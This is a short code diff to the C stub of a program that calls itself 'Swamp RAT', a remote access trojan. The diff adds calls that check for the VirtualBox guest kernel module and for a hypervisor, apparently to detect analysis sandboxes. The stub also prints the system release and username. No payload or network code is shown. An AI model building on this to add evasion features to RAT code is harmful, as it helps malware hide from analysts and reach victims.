@@ -19,6 +19,7 @@
 #include <string.h>
 #include "include/stub/shell.h"
 #include "include/stub/sys.h"
+#include "include/stub/re.h"
 void help_menu(){
   printf("Swamp RAT Stub!\n");
 }
@@ -31,5 +32,7 @@ int main(){
   printf("%s\n", p_sys_info->release);
   printf("%s\n", p_sys_info->username);
   free(p_sys_info);
+  printf("module: %d\n", re_kernel_module("vboxguest"));
+  printf("hypervisor: %d\n", re_hypervisor());
   return 0;
 }
